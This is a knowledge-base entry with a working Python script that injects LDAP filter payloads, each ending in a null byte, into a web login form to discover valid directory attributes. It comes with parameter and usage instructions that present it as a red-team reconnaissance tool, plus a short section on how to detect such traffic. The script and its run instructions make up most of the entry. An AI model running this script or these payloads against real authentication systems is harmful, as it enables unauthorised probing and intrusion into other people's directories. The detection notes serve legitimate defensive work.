---
type: code
language: Python
verified: true
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - ldap-injection
  - discovery-script
  - python
validated: true
---

# Python-LDAP-Field-Discovery-Script

## Code

```python
#!/usr/bin/python3

import requests
import string

fields = []

url = 'https://URL.com/'

f = open('dic', 'r') #Open the wordlists of common attributes
wordl = f.read().split('\n')
f.close()

for i in wordl:
    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
    if 'TRUE CONDITION' in r.text:
        fields.append(str(i))

print(fields)
```

## Description

This Python script automates the discovery of valid LDAP attributes in a web application vulnerable to LDAP injection. It reads a wordlist of potential attributes, crafts an injection payload for each (appending to a boolean LDAP statement terminated by a null byte), sends POST requests to the target login endpoint, and checks responses for a 'TRUE CONDITION' indicator. Valid attributes are collected and printed, aiding in crafting more precise injection attacks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `url` | Target web application URL (login endpoint) | `'https://target.com/login'` |
| `'dic'` | Path to wordlist file with LDAP attributes (one per line) | `'dic'` (current directory) |
| `'login'` | Form field name for the injection payload | `'login'` (adjust if different) |
| `'password'` | Dummy password field value | `'bla'` |
| `'TRUE CONDITION'` | String indicating a successful (true) LDAP query in response | `'TRUE CONDITION'` (customize based on app) |

## Usage

Save this code to a file (e.g., ldap_discovery.py), update the `url` and wordlist path, ensure 'requests' is installed (pip install requests), and run with `python3 ldap_discovery.py`. Use in red team engagements for initial reconnaissance against LDAP-backed authentication systems. Follow with manual testing in tools like Burp Suite for verification.

## Detection

- Web server logs showing repeated POST requests to login endpoints with payloads containing parentheses, asterisks, equals, and null bytes (\x00).
- LDAP server query logs revealing anomalous filters like '*(attribute=*)' or excessive attribute tests.
- Network monitoring for high-volume requests from a single IP to authentication paths.
- Application logs indicating failed or unusual LDAP binds with boolean conditions.

## Related

- [[procedures/LDAP-Field-Discovery-for-Injection]]
